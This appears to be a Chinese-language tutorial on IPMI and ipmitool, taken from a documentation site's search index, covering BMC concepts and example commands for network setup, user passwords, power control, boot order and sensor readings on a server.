\u80fd\u591f\u6a2a\u8de8\u4e0d\u540c\u7684\u64cd\u4f5c\u7cfb\u7edf\u3001\u56fa\u4ef6\u548c\u786c\u4ef6\u5e73\u53f0\uff0c\u53ef\u4ee5\u667a\u80fd\u7684\u76d1\u89c6\u3001\u63a7\u5236\u548c\u4e0a\u62a5\u670d\u52a1\u5668\u7684\u8fd0\u4f5c\u72b6\u51b5\uff08e.g. \u8fdc\u7a0b\u5f00\u542f\u3001\u5173\u95ed\u7535\u6e90\uff09\u4ee5\u53ca\u5065\u5eb7\u7279\u5f81\uff08e.g. \u6e29\u5ea6\u3001\u7535\u538b\u3001\u98ce\u6247\u5de5\u4f5c\u72b6\u6001\u3001\u7535\u6e90\u72b6\u6001\u7b49\uff09\u3002 IPMI \u826f\u597d\u7684\u81ea\u6cbb\u7279\u6027\u514b\u670d\u4e86\u4ee5\u5f80\u57fa\u4e8e\u64cd\u4f5c\u7cfb\u7edf\u7684\u7ba1\u7406\u65b9\u5f0f\u6240\u53d7\u7684\u9650\u5236\uff0c\u5b9e\u73b0\u4e86\u5728\u64cd\u4f5c\u7cfb\u7edf\u4e0d\u54cd\u5e94\u6216\u672a\u52a0\u8f7d\u7684\u60c5\u51b5\u4e0b\u4ecd\u7136\u53ef\u4ee5\u5bf9\u5176\u8fdb\u884c\u5f00\u5173\u673a\u3001\u4fe1\u606f\u63d0\u53d6\u7b49\u64cd\u4f5c\u3002 OpenStack Ironic \u6b63\u662f\u5229\u7528\u6b64\u6280\u672f\u53ef\u4ee5\u8fdc\u7a0b\u7684\u5bf9\u88f8\u673a\u8fdb\u884c\u4e0a\u4e0b\u7535\u6216\u8005\u5176\u4ed6\u64cd\u4f5c\uff0c\u800c\u4e0d\u662f\u4f9d\u8d56\u7269\u7406\u5f00\u5173\u6216\u8005\u64cd\u4f5c\u7cfb\u7edf\u3002 IPMI \u7684\u6838\u5fc3\u662f BMC \uff08Baseboard Management Controller \uff0c\u57fa\u677f\u7ba1\u7406\u63a7\u5236\u5668\uff09\u3002\u5f53\u9700\u8981\u5bf9\u7cfb\u7edf\u6587\u672c\u63a7\u5236\u53f0\u8fdb\u884c\u8fdc\u7a0b\u8bbf\u95ee\u65f6\uff0c IPMI \u7684 SOL \uff08Serial Over LAN\uff0cLAN \u4e0a\u4e32\u53e3\uff09\u529f\u80fd\u975e\u5e38\u5173\u952e\u3002 SOL \u901a\u8fc7\u5c06 IPMI \u4f1a\u8bdd\u91cd\u5b9a\u5411\u5230\u672c\u5730\u4e32\u884c\u63a5\u53e3\uff0c\u5141\u8bb8\u8fdc\u7a0b\u8bbf\u95ee Windows \u7684\u7d27\u6025\u4e8b\u4ef6\u7ba1\u7406\u63a7\u5236\u53f0\uff08EMS\uff09\u7279\u6b8a\u7ba1\u7406\u63a7\u5236\u53f0\uff08SAC\uff09\u6216\u8bbf\u95ee Linux \u7684\u4e32\u884c\u63a7\u5236\u53f0\u3002 BMC \u901a\u8fc7\u5728 LAN \u4e0a\u91cd\u5b9a\u5411\u4e32\u884c\u7aef\u53e3\u7684\u4fe1\u606f\u6765\u505a\u5230\u8fd9\u70b9\uff0c\u4ece\u800c\u63d0\u4f9b\u4e86\u4e00\u79cd\u4e0e\u670d\u52a1\u5668\u5382\u5546\u65e0\u5173\u7684\u8fdc\u7a0b\u67e5\u770b OS BootLoader \u6216\u7d27\u6025\u7ba1\u7406\u63a7\u5236\u53f0\u6765\u8bca\u65ad\u548c\u7ef4\u4fee\u6545\u969c\u7684\u6807\u51c6\u65b9\u5f0f\uff0c IPMI \u751a\u81f3\u5141\u8bb8\u5728\u64cd\u4f5c\u7cfb\u7edf\u5f15\u5bfc\u9636\u6bb5\u914d\u7f6e\u5404\u79cd\u7ec4\u4ef6\u3002 ipmitool \uf0c1 ipmitool \u662f\u4e00\u4e2a\u7528\u4e8e\u7ba1\u7406\u548c\u914d\u7f6e\u652f\u6301\u667a\u80fd\u5e73\u53f0\u7ba1\u7406\u63a5\u53e3\u7684\u8bbe\u5907\u7684\u5b9e\u7528\u7a0b\u5e8f\u3002 ipmitool \u7a0b\u5e8f\u4e3a BMC \u63d0\u4f9b\u4e86\u4e00\u4e2a\u7b80\u5355\u7684\u547d\u4ee4\u884c\u754c\u9762\u3002\u5b83\u5177\u6709\u8bfb\u53d6\u4f20\u611f\u5668\u6570\u636e\u5b58\u50a8\u5e93 (sensor data repository\uff0c\u7b80\u79f0SDR) \u548c\u6253\u5370\u4f20\u611f\u5668\u503c\u3001\u663e\u793a\u7cfb\u7edf\u4e8b\u4ef6\u65e5\u5fd7 (System Event Log\uff0c\u7b80\u79f0SEL) \u7684\u5185\u5bb9\u3001\u6253\u5370\u73b0\u573a\u53ef\u66f4\u6362\u5355\u5143 (Field Replaceable Unit\uff0c\u7b80\u79f0FRU) \u5e93\u5b58\u4fe1\u606f\u3001\u8bfb\u53d6\u548c\u8bbe\u7f6e LAN \u914d\u7f6e\u53c2\u6570\u4ee5\u53ca\u6267\u884c\u8fdc\u7a0b\u673a\u7bb1\u7535\u6e90\u63a7\u5236\u3002 IPMItool \u4e3b\u9875: http://github.com/ipmitool/ipmitool \u667a\u80fd\u5e73\u53f0\u7ba1\u7406\u63a5\u53e3\u89c4\u8303: https://www.intel.com/content/www/us/en/servers/ipmi/ipmi-home.html OpenIPMI \u9879\u76ee\uff1aLinux IPMI \u5185\u6838\u9a71\u52a8\u7a0b\u5e8f\u548c\u7528\u6237\u6001\u5e93 http://openipmi.sourceforge.net \u80cc\u666f \uf0c1 Sun Microsystems \u521a\u521a\u5f00\u59cb\u5f00\u53d1\u65b0\u7684\u901a\u7528 x86 \u670d\u52a1\u5668\u7cfb\u5217\uff0c\u5176\u4e2d\u5305\u62ec\u4e00\u4e2a\u5e26\u6709 IPMIv1.5 BMC \u7684 OEM Intel \u4e3b\u677f\u3002 ipmitool \u6700\u521d\u7684\u4f5c\u8005\u5f00\u59cb\u7684\u60f3\u6cd5\u662f\u8fdc\u7a0b\u673a\u7bb1\u7535\u6e90\u63a7\u5236\u4f1a\u5f88\u65b9\u4fbf\u5728\u5b9e\u9a8c\u5ba4\u4e2d\u4e3a\u4ed6\u7684\u7cfb\u7edf\u63d0\u4f9b\u7684\u529f\u80fd\uff0c\u5e76\u4ece\u90a3\u91cc\u53d1\u5c55\u6210\u4e3a\u4e00\u4e2a\u591a\u529f\u80fd\u5de5\u5177\uff0c\u5f88\u591a\u4eba\u90fd\u89c9\u5f97\u5b83\u5f88\u6709\u7528\u3002\u4ed6\u51b3\u5b9a\u5728 BSD \u8bb8\u53ef\u4e0b\u53d1\u5e03\u5b83\uff0c\u5e76\u8ba9\u5176\u4ed6\u4eba\u6709\u673a\u4f1a\u4f7f\u7528\u5b83\u3002 ipmitool \u4e0d\u662f\u4e3a\u4e86\u63d0\u4f9b\u5927\u89c4\u6a21\uff08\u53c8\u540d\u4f01\u4e1a\uff09\u7ba1\u7406\u5e94\u7528\u7a0b\u5e8f\u529f\u80fd\u800c\u7f16\u5199\u7684\u3002 ipmitool \u63d0\u4f9b\u7684\u529f\u80fd\u5f88\u5bb9\u6613\u901a\u8fc7\u53d1\u9001\u7b80\u5355\u7684 IPMI \u8bf7\u6c42\u6d88\u606f\u5e76\u89e3\u6790\u8fd4\u56de\u7684\u54cd\u5e94\u6765\u5b8c\u6210\u3002\u5b83\u65e8\u5728\u4f9b\u559c\u6b22\u547d\u4ee4\u884c\u5b9e\u7528\u7a0b\u5e8f\u7684\u7b80\u5355\u6027\u548c\u53ef\u7f16\u5199\u811a\u672c\u7684\u7cfb\u7edf\u7ba1\u7406\u5458\u4ee5\u53ca\u8c03\u8bd5\u6216\u5f00\u53d1\u81ea\u5df1\u7684 BMC \u5b9e\u73b0\u7684\u7cfb\u7edf\u7ba1\u7406\u5458\u4f7f\u7528\u3002 \u8981\u6c42 \uf0c1 \u663e\u7136\uff0c\u6700\u5927\u7684\u8981\u6c42\u662f\u5177\u6709\u652f\u6301 IPMI \u89c4\u8303\u7684\u670d\u52a1\u5904\u7406\u5668\u7684\u786c\u4ef6\u3002\u8bb8\u591a\u57fa\u4e8e x86 \u7684\u670d\u52a1\u5668\u73b0\u5728\u90fd\u63d0\u4f9b IPMI \u652f\u6301\uff0c\u8bf7\u5411\u60a8\u9996\u9009\u7684\u786c\u4ef6\u4f9b\u5e94\u5546\u54a8\u8be2\u53ef\u7528\u4ea7\u54c1\u3002 \u4e00\u65e6\u60a8\u786e\u5b9a\u62e5\u6709\u6240\u9700\u7684\u786c\u4ef6\uff0c\u60a8\u5c31\u9700\u8981\u51b3\u5b9a\u5982\u4f55\u8bbf\u95ee BMC \u3002\u6700\u5e38\u89c1\u7684\u60c5\u51b5\u662f\u901a\u8fc7\u7cfb\u7edf\u63a5\u53e3\u6216 LAN \u8fdb\u884c\u8bbf\u95ee\u3002\uff08\u6216 serial \uff0c\u4f46\u76ee\u524d ipmitool \u4e0d\u652f\u6301 serial \u63a5\u53e3\uff09 \u7cfb\u7edf\u63a5\u53e3 \uf0c1 \u7cfb\u7edf\u63a5\u53e3\u6709\u591a\u79cd\u7c7b\u578b\uff0c\u4f46\u90fd\u8db3\u591f\u76f8\u4f3c\uff0c\u5141\u8bb8\u5355\u4e00\u7cbe\u5fc3\u8bbe\u8ba1\u7684\u9a71\u52a8\u7a0b\u5e8f\u6765\u652f\u6301\u5b83\u4eec\u3002\u4e0d\u540c\u7c7b\u578b\u7684\u7cfb\u7edf\u63a5\u53e3\u5305\u62ec\u952e\u76d8\u63a7\u5236\u5668\u6837\u5f0f(KCS)\u3001\u5757\u4f20\u8f93 (BT)\u3001\u7cfb\u7edf\u7ba1\u7406\u63a5\u53e3\u82af\u7247 (SMIC) \u548c SMBus\u3002\u4e0d\u540c\u7684\u786c\u4ef6\u4f9b\u5e94\u5546\u4f1a\u6709\u4e0d\u540c\u7684\u504f\u597d\u548c\u5b9e\u73b0\u3002 \u5728 Linux \u4e0a\uff0c OpenIPMI \u5185\u6838\u9a71\u52a8\u7a0b\u5e8f\u5e94\u8be5\u652f\u6301\u6240\u6709\u8fd9\u4e9b\u7cfb\u7edf\u63a5\u53e3\uff0c\u5e76\u4e14\u52a0\u8f7d\u6b63\u786e\u7684\u5185\u6838\u6a21\u5757\u5e76\u8bbe\u7f6e\u8bbe\u5907\u8282\u70b9\u4ee5\u4f7f\u7528\u5b83\u5e94\u8be5\u662f\u4e00\u4ef6\u7b80\u5355\u7684\u4e8b\u60c5\u3002\u9a71\u52a8\u7a0b\u5e8f\u6a21\u5757\u540d\u79f0\u5728\u4e0d\u540c\u5185\u6838\u7248\u672c\u4e2d\u7565\u6709\u4e0d\u540c\uff0c\u4f46\u5bf9\u4e8e\u6240\u6709\u7248\u672c\uff0c\u60a8\u90fd\u9700\u8981\u8fd9\u4e24\u4e2a\u6a21\u5757\uff1a ipmi_msghandler\uff1a\u4f20\u5165\u548c\u4f20\u51fa\u6d88\u606f\u5904\u7406\u7a0b\u5e8f ipmi_devintf\uff1aIPMI \u9a71\u52a8\u7a0b\u5e8f\u7684\u5b57\u7b26\u8bbe\u5907\u63a5\u53e3 \u5bf9\u4e8e 2.4.x \u548c\u65e9\u671f\u7684 2.6.x \u5185\u6838\uff0c\u60a8\u9700\u8981\u6839\u636e\u786c\u4ef6\u652f\u6301\u7684\u7cfb\u7edf\u63a5\u53e3\u7c7b\u578b\u9009\u62e9\u6a21\u5757\u3002\u4f8b\u5982\uff1a ipmi_kcs_drv\uff1a\u952e\u76d8\u63a7\u5236\u5668\u6837\u5f0f\u9a71\u52a8\u7a0b\u5e8f \u6700\u65b0\u7684 2.6.x \u5185\u6838\u5df2\u5c06\u5b83\u4eec\u7ec4\u5408\u6210\u4e00\u4e2a\u6a21\u5757\uff1a ipmi_si\uff1a\u901a\u7528 IPMI \u7cfb\u7edf\u63a5\u53e3\u9a71\u52a8\u7a0b\u5e8f \u6709\u5173\u54ea\u4e9b\u5185\u6838\u6a21\u5757\u662f\u5fc5\u987b\u7684\uff0c\u66f4\u591a\u4fe1\u606f\u8bf7\u53c2\u9605\u60a8\u7684\u53d1\u884c\u7248\u548c/\u6216\u5185\u6838\u968f\u9644\u7684\u6587\u6863\u3002\u4e00\u65e6\u52a0\u8f7d\u4e86\u6240\u9700\u7684\u6a21\u5757\u5e76\u4e14\u9a71\u52a8\u7a0b\u5e8f\u627e\u5230\u4e86\u9002\u5408 BMC \u7684\u7cfb\u7edf\u63a5\u53e3\uff0c\u90a3\u4e48\u60a8\u9700\u8981\u786e\u4fdd /dev/ipmi0 \u5904\u7684\u8bbe\u5907\u8282\u70b9\u6307\u5411\u6b63\u786e\u7684\u4e3b\u8bbe\u5907\u53f7\u3002 \u8fd9\u662f\u56e0\u4e3a\u5f53\u5b83\u88ab\u52a0\u8f7d\u65f6 OpenIPMI \u88ab\u8d4b\u4e88\u4e86\u4e00\u4e2a\u52a8\u6001\u5206\u914d\u7684\u4e3b\u7f16\u53f7\uff0c\u4f46\u53d6\u51b3\u4e8e\u5b58\u5728\u7684\u5176\u4ed6\u6a21\u5757\uff0c\u8fd9\u4e2a\u6570\u5b57\u53ef\u80fd\u662f\u4ece 254 \u5f00\u59cb\u3002\u6700\u7b80\u5355\u7684\u5224\u65ad\u65b9\u6cd5\u662f\u68c0\u67e5 /proc/devices \u7684\u8f93\u51fa\u5e76\u67e5\u770b\u201cipmidev\u201d\u8bbe\u5907\u5206\u914d\u7ed9\u54ea\u4e2a\u4e3b\u7f16\u53f7\u3002 ipmitool \u5305\u542b\u4e00\u4e2a\u540d\u4e3a ipmi.init \u7684\u793a\u4f8b\u811a\u672c\uff0c\u53ef\u7528\u4e8e\u5728\u542f\u52a8\u65f6\u81ea\u52a8\u6267\u884c\u6b64\u8fc7\u7a0b\u3002 \u5b89\u88c5 \uf0c1 $ sudo apt install ipmitool \u4ece\u6e90\u7801\u7f16\u8bd1\u5b89\u88c5\u8bf7\u53c2\u8003: https://github.com/ipmitool/ipmitool/blob/master/INSTALL \u7528\u6cd5 \uf0c1 ipmitool \u7684\u6240\u6709\u8c03\u7528\u90fd\u9700\u8981\u6307\u5b9a\u8981\u4f7f\u7528\u7684\u63a5\u53e3\uff0c\u9664\u975e\u60a8\u60f3\u4f7f\u7528\u5728\u7f16\u8bd1\u65f6\u8bbe\u7f6e\u7684\u9ed8\u8ba4\u63a5\u53e3\u3002\u6bcf\u4e2a\u8c03\u7528\u8fd8\u5fc5\u987b\u6307\u5b9a\u8981\u8fd0\u884c\u7684\u547d\u4ee4\u3002\u60a8\u53ef\u4ee5\u5728\u4f7f\u7528 -h \u9009\u9879\u7684\u4f7f\u7528\u8f93\u51fa\u4e2d\u67e5\u770b\u652f\u6301\u7684\u63a5\u53e3\u5217\u8868\u548c\u9ed8\u8ba4\u63a5\u53e3\u5217\u8868\u4ee5\u53ca\u9876\u7ea7\u547d\u4ee4\u5217\u8868\uff1a usage: ipmitool [options...] <command> -h This help -V Show version information -v Verbose (can use multiple times) -c Display output in comma separated format -I intf Interface to use -H hostname Remote host name for LAN interface -p port Remote RMCP port [default=623] -L level Remote session privilege level [default=USER] -A authtype Force use of authtype NONE, PASSWORD, MD2 or MD5 -U username Remote session username -P password Remote session password -f file Read remote session password from file -a Prompt for remote password -E Read password from IPMI_PASSWORD environment variable -m address Set local IPMB address -t address Bridge request to remote target address Interfaces: open Linux OpenIPMI Interface [default] imb Intel IMB Interface lan IPMI v1.5 LAN Interface lanplus IPMI v2.0 RMCP+ LAN Interface Commands: raw Send a RAW IPMI request and print response lan Configure LAN Channels chassis Get chassis status and set power state event Send pre-defined events to BMC bmc Print BMC status and configure global enables sdr Print Sensor Data Repository entries and readings sensor Print detailed sensor information fru Print built-in FRU and scan SDR for FRU locators sel Print System Evelnt Log sol Configure IPMIv2.0 Serial-over-LAN user Configure BMC users channel Configure BMC channels session Print session information shell Launch interactive IPMI shell exec Run list of commands from file set Set runtime variable for shell and exec ipmitool\u8fd0\u7ef4\u7ba1\u7406\u793a\u4f8b \uf0c1 \u5f00\u59cb\u4f7f\u7528 IPMI \u547d\u4ee4\u3002 \u542f\u52a8\u76f8\u5e94\u5185\u6838\u6a21\u5757 \uf0c1 root@dbtuserver:~# modprobe ipmi_msghandler root@dbtuserver:~# modprobe ipmi_devintf root@dbtuserver:~# modprobe ipmi_si root@dbtuserver:~# lsmod | grep ipmi ipmi_ssif 36864 0 ipmi_si 65536 0 ipmi_devintf 20480 0 ipmi_msghandler 106496 3 ipmi_devintf,ipmi_si,ipmi_ssif \u5e26\u5916\u7ba1\u7406IP\u5730\u5740 \uf0c1 \u547d\u4ee4\u683c\u5f0f\u5982\u4e0b: ipmitool lan print [<channel number>] ipmitool lan set <channel number> <command> <parameter> # \u8bbe\u7f6e\u9759\u6001IP\u5730\u5740 root@dbtuserver:~# ipmitool lan set 1 ipsrc static # \u8bbe\u7f6eIP\u5730\u5740 root@dbtuserver:~# ipmitool lan set 1 ipaddr 192.168.0.110 # \u8bbe\u7f6e\u5b50\u7f51\u63a9\u7801 root@dbtuserver:~# ipmitool lan set 1 netmask 255.255.255.0 # \u8bbe\u7f6e\u7f51\u5173\u5730\u5740 root@dbtuserver:~# ipmitool lan set 1 defgw ipaddr 192.168.0.1 # \u67e5\u770b\u5e26\u5916\u7ba1\u7406IP\u5730\u5740 root@dbtuserver:~# ipmitool lan print 1 Set in Progress : Set Complete Auth Type Support : MD5 Auth Type Enable : Callback : MD5 : User : MD5 : Operator : MD5 : Admin : MD5 : OEM : MD5 IP Address Source : Static Address IP Address : 192.168.0.110 Subnet Mask : 255.255.255.0 MAC Address : 04:d9:f5:50:f9:b6 SNMP Community String : AMI IP Header : TTL=0x40 Flags=0x40 Precedence=0x00 TOS=0x10 BMC ARP Control : ARP Responses Enabled, Gratuitous ARP Disabled Gratituous ARP Intrvl : 0.0 seconds Default Gateway IP : 192.168.0.1 Default Gateway MAC : 8c:16:45:14:31:4c Backup Gateway IP : 0.0.0.0 Backup Gateway MAC : 00:00:00:00:00:00 802.1q VLAN ID : Disabled 802.1q VLAN Priority : 0 RMCP+ Cipher Suites : 0,1,2,3,6,7,8,11,12,15,16,17 Cipher Suite Priv Max : XaaaaaaaaaaaXXX : X=Cipher Suite Unused : c=CALLBACK : u=USER : o=OPERATOR : a=ADMIN : O=OEM Bad Password Threshold : 0 Invalid password disable: no Attempt Count Reset Int.: 0 User Lockout Interval : 0 \u5e26\u5916\u7ba1\u7406\u7528\u6237\u5bc6\u7801 \uf0c1 \u547d\u4ee4\u683c\u5f0f\u5982\u4e0b: ipmitool user summary [<channel number>] ipmitool user list [<channel number>] ipmitool user set name <user id> <username> ipmitool user set password <user id> [<password> <16|20>] ipmitool user disable <user id> ipmitool user enable <user id> ipmitool user priv <user id> <privilege level> [<channel number>] ipmitool user Privilege levels: ipmitool user * 0x1 - Callback ipmitool user * 0x2 - User ipmitool user * 0x3 - Operator ipmitool user * 0x4 - Administrator ipmitool user * 0x5 - OEM Proprietary ipmitool user * 0xF - No Accipmitool user ipmitool user test <user id> <16|20> [<password]> # \u8bbe\u7f6e\u7528\u6237\"admin\"(ID\u4e3a2)\u7684\u5bc6\u7801\u4e3a\"dbtu2017\" root@dbtuserver:~# ipmitool user set password 2 dbtu2017 Set User Password command successful (user 2) # \u67e5\u8be2\u6240\u6709\u7528\u6237\u5217\u8868 root@dbtuserver:~# ipmitool user list 1 ID Name Callin Link Auth IPMI Msg Channel Priv Limit 1 false false true ADMINISTRATOR 2 admin false false true ADMINISTRATOR 3 true false false NO ACCESS 4 true false false NO ACCESS 5 true false false NO ACCESS 6 true false false NO ACCESS 7 true false false NO ACCESS 8 true false false NO ACCESS 9 true false false NO ACCESS 10 true false false NO ACCESS ipmitool \u7535\u6e90\u7ba1\u7406 \uf0c1 ipmitool [chassis] \u547d\u4ee4 \u63cf\u8ff0 ipmitool [chassis] power status \u83b7\u53d6\u7535\u6e90\u72b6\u6001 ipmitool [chassis] power on \u786c\u5f00\u673a ipmitool [chassis] power off \u786c\u65ad\u7535\u5173\u673a ipmitool [chassis] power soft \u901a\u8fc7acpi\u8fdb\u884c\u8f6f\u5173\u673a\uff0c\u5982\u540c\u8f7b\u6309\u4e00\u4e0b\u5f00\u673a\u952e ipmitool [chassis] power reset \u786c\u91cd\u542f ipmitool [chassis] power cycle \u5f3a\u5236\u5173\u95ed\u7535\u6e90\uff0c\u7b49\u5f851\u79d2\u7136\u540e\u518d\u6253\u5f00\u7535\u6e90\u7684\u7ec4\u5408 # \u547d\u4ee4\u5e2e\u52a9 root@dbtuserver:~# ipmitool chassis power help chassis power Commands: status, on, off, cycle, reset, diag, soft root@dbtuserver:~# ipmitool power status Chassis Power is on # ipmitool -H 192.168.0.110 -U admin -P dbtu2017 chassis power off Chassis Power Control: Down/Off # ipmitool -H 192.168.0.110 -U admin -P dbtu2017 chassis power on Chassis Power Control: Up/On \u4fee\u6539\u670d\u52a1\u5668\u5f15\u5bfc\u542f\u52a8\u987a\u5e8f \uf0c1 # \u547d\u4ee4\u5e2e\u52a9 root@dbtuserver:~# ipmitool chassis bootdev help bootdev <device> [clear-cmos=yes|no] bootdev <device> [options=help,...] none : Do not change boot device order pxe : Force PXE boot disk : Force boot from default Hard-drive safe : Force boot from default Hard-drive, request Safe Mode diag : Force boot from Diagnostic Partition cdrom : Force boot from CD/DVD bios : Force boot into BIOS Setup floppy: Force boot from Floppy/primary removable media # PXE\u5f15\u5bfc\u542f\u52a8 ipmitool -I lan -H <server_ip> -U root -P passwd chassis bootdev pxe # \u4ece\u786c\u76d8\u5f15\u5bfc\u542f\u52a8 ipmitool -I lan -H <server_ip> -U root -P passwd chassis bootdev disk # \u4eceCD/DVD\u5f15\u5bfc\u542f\u52a8 ipmitool -I lan -H <server_ip> -U root -P passwd chassis bootdev cdrom \u67e5\u770b\u76f8\u5173\u7684\u4f20\u611f\u5668\u4fe1\u606f \uf0c1 root@dbtuserver:~# ipmitool sdr [list] CPU1 Temperature | 39 degrees C | ok CPU2 Temperature | 38 degrees C | ok PSU1 Over Temp | 0x00 | ok PSU2 Over Temp | 0x00 | ok TR1 Temperature | 26 degrees C | ok TR2 Temperature | 55 degrees C | ok TR3 Temperature | 25 degrees C | ok DIMMA1_Temp | 32 degrees C | ok DIMMA2_Temp | 0 degrees C | nr DIMMB1_Temp | 0 degrees C | nr DIMMC1_Temp | 0 degrees C | nr DIMMD1_Temp | 33 degrees C | ok DIMMD2_Temp | 0 degrees C | nr DIMME1_Temp | 0 degrees C | nr DIMMF1_Temp | 0 degrees C | nr DIMMG1_Temp | 31 degrees C | ok DIMMG2_Temp | 0 degrees C | nr DIMMH1_Temp | 0 degrees C | nr DIMMJ1_Temp | 0 degrees C | nr DIMMK1_Temp | 31 degrees C | ok DIMMK2_Temp | 0 degrees C | nr DIMML1_Temp | 0 degrees C | nr DIMMM1_Temp | 0 degrees C | nr CPU1_ECC1 | 0x00 | ok CPU2_ECC1 | 0x00 | ok +VCCIO1 | 0.99 Volts | ok +VCCIO2 | 0.99 Volts | ok +VCORE1 | 1.78 Volts | ok +VCORE2 | 1.78 Volts | ok +VDDQ_ABC_CPU1 | 1.22 Volts | ok +VDDQ_DEF_CPU1 | 1.22 Volts | ok +VDDQ_GHJ_CPU2 | 1.21 Volts | ok +VDDQ_KLM_CPU2 | 1.22 Volts | ok +12V | 11.89 Volts | ok +5V | 5.04 Volts | ok +3.3V | 3.31 Volts | ok +5VSB | 5.06 Volts | ok +3.3VSB | 3.30 Volts | ok VBAT | 3.12 Volts | ok PMBPower1 | 216 Watts | ok PMBPower2 | 184 Watts | ok PSU1 AC Lost | 0x00 | ok PSU2 AC Lost | 0x00 | ok PSU1 PWR Detect | 0x00 | ok PSU2 PWR Detect | 0x00 | ok CPU_CATERR | 0x00 | ok Memory_Train_ERR | 0x00 | ok FRNT_FAN1 | 3000 RPM | ok FRNT_FAN2 | 3300 RPM | ok FRNT_FAN3 | 3200 RPM | ok FRNT_FAN4 | 3200 RPM | ok FRNT_FAN5 | 3000 RPM | ok FRNT_FAN6 | 3000 RPM | ok FRNT_FAN7 | 0 RPM | nr PSU1 Slow FAN1 | 0x00 | ok PSU2 Slow FAN1 | 0x00 | ok Backplane1 HD01 | 0x00 | ok Backplane1 HD02 | 0x00 | ok Backplane1 HD03 | 0x00 | ok Backplane1 HD04 | 0x00 | ok Backplane1 HD05 | 0x00 | ok Backplane1 HD06 | 0x00 | ok Backplane1 HD07 | 0x00 | ok Backplane1 HD08 | 0x00 | ok NM Capabilities | 0x00 | ok Watchdog2 | 0x00 | ok","title":"ipmi"},{"location":"linux_development/ipmi/#ipmi","text":"\u667a\u80fd\u5e73\u53f0\u7ba1\u7406\u63a5\u53e3\u3002","title":"IPMI"},{"location":"linux_development/ipmi/#platform-management","text":"\u5e73\u53f0\u7ba1\u7406(Platform Management)\u8868\u793a\u7684\u662f\u4e00\u7cfb\u5217\u7684\u76d1\u89c6\u548c\u63a7\u5236\u529f\u80fd\uff0c\u64cd\u4f5c\u7684\u5bf9\u8c61\u662f\u7cfb\u7edf\u786c\u4ef6\u3002\u6bd4\u5982\uff1a\u901a\u8fc7\u76d1\u89c6\u7cfb\u7edf\u7684\u6e29\u5ea6\uff0c\u7535\u538b\uff0c\u98ce\u6247\u3001\u7535\u6e90\u7b49\u7b49\uff0c\u5e76\u505a\u76f8\u5e94\u7684\u8c03\u8282\u5de5\u4f5c\uff0c\u4ee5\u4fdd\u8bc1\u7cfb\u7edf\u5904\u4e8e\u5065\u5eb7\u7684\u72b6\u6001\u3002\u5982\u679c\u7cfb\u7edf\u771f\u7684\u4e0d\u6b63\u5e38\u4e86\uff0c\u4e5f\u53ef\u4ee5\u901a\u8fc7\u590d\u4f4d\u7684\u65b9\u5f0f\u6765\u91cd\u65b0\u542f\u52a8\u7cfb\u7edf\u3002\u540c\u65f6\u5e73\u53f0\u7ba1\u7406\u8fd8\u8d1f\u8d23\u8bb0\u5f55\u5404\u79cd\u786c\u4ef6\u7684\u4fe1\u606f\u548c\u65e5\u5fd7\u8bb0\u5f55\uff0c\u7528\u4e8e\u63d0\u793a\u7528\u6237\u548c\u540e\u7eed\u95ee\u9898\u7684\u5b9a\u4f4d\u3002 \u4ee5\u4e0a\u7684\u8fd9\u4e9b\u529f\u80fd\u53ef\u4ee5\u96c6\u6210\u5230\u4e00\u4e2a\u63a7\u5236\u5668\u4e0a\u6765\u5b9e\u73b0\uff0c\u8fd9\u4e2a\u63a7\u5236\u5668\u88ab\u79f0\u4e3a BMC \uff08Baseboard Manager Controller\uff0c\u57fa\u677f\u7ba1\u7406\u63a7\u5236\u5668\uff09\u3002","title":"\u5e73\u53f0\u7ba1\u7406"},{"location":"linux_development/ipmi/#bmc","text":"BMC \u901a\u5e38\u662f\u4e00\u4e2a\u5b89\u88c5\u5728\u670d\u52a1\u5668\u4e3b\u677f\u4e0a\u7684\u72ec\u7acb\u677f\u5361\uff0c\u5176\u4e0d\u4f9d\u8d56\u4e8e\u670d\u52a1\u5668\u7684\u5904\u7406\u5668\u3001BIOS \u6216\u64cd\u4f5c\u7cfb\u7edf\u6765\u5de5\u4f5c\uff0c\u53ef\u8c13\u975e\u5e38\u5730\u72ec\u7acb\uff0c\u662f\u4e00\u4e2a\u5355\u72ec\u5728\u7cfb\u7edf\u5185\u8fd0\u884c\u7684\u65e0\u4ee3\u7406\u7ba1\u7406\u5b50\u7cfb\u7edf\u3002\u901a\u4fd7\u6765\u8bb2\uff0c BMC \u662f\u6574\u4e2a\u670d\u52a1\u5668\u5355\u677f\u7684\u5927\u7ba1\u5bb6\u3002 BMC \u4e0e\u4e3b\u677f\u4e0a\u7684\u4e0d\u540c\u4f20\u611f\u5668\u901a\u4fe1\u6765\u76d1\u89c6\u7cfb\u7edf\u662f\u5426\u6709\u4e25\u91cd\u4e8b\u4ef6\uff0c\u5e76\u5728\u67d0\u4e9b\u53c2\u6570\u8d85\u51fa\u5176\u9884\u7f6e\u9608\u503c\u65f6\u53d1\u51fa\u8b66\u62a5\u548c\u65e5\u5fd7\u4e8b\u4ef6\u3002\u6240\u6709\u7684 IPMI \u529f\u80fd\u90fd\u662f\u5411 BMC \u53d1\u9001\u547d\u4ee4\uff08IPMI \u89c4\u8303\u4e2d\u89c4\u5b9a\u7684\u6307\u4ee4\uff09\u6765\u5b8c\u6210\u7684\uff0c BMC \u63a5\u6536\u5e76\u5728\u7cfb\u7edf\u4e8b\u4ef6\u65e5\u5fd7\u4e2d\u8bb0\u5f55\u4e8b\u4ef6\u6d88\u606f\uff0c\u7ef4\u62a4\u63cf\u8ff0\u7cfb\u7edf\u4e2d\u4f20\u611f\u5668\u60c5\u51b5\u7684\u4f20\u611f\u5668\u6570\u636e\u8bb0\u5f55\u3002 BMC \u5177\u6709\u4ee5\u4e0b\u529f\u80fd\uff1a \u901a\u8fc7\u7cfb\u7edf\u7684\u4e32\u884c\u7aef\u53e3\u8fdb\u884c\u8bbf\u95ee \u6545\u969c\u65e5\u5fd7\u8bb0\u5f55\u548c SNMP \u8b66\u62a5\u53d1\u9001 \u8bbf\u95ee\u7cfb\u7edf\u4e8b\u4ef6\u65e5\u5fd7\u548c\u4f20\u611f\u5668\u72b6\u51b5 \u8fdc\u7a0b\u5f00\u3001\u5173\u673a \u72ec\u7acb\u4e8e\u7cfb\u7edf\u7535\u6e90\u6216\u5de5\u4f5c\u72b6\u6001\u7684\u652f\u6301 \u7528\u4e8e\u7cfb\u7edf\u8bbe\u7f6e\u3001\u57fa\u4e8e\u6587\u672c\u516c\u7528\u7a0b\u5e8f\u548c\u64cd\u4f5c\u7cfb\u7edf\u63a7\u5236\u53f0\u7684\u6587\u672c\u63a7\u5236\u53f0\u91cd\u5b9a\u5411 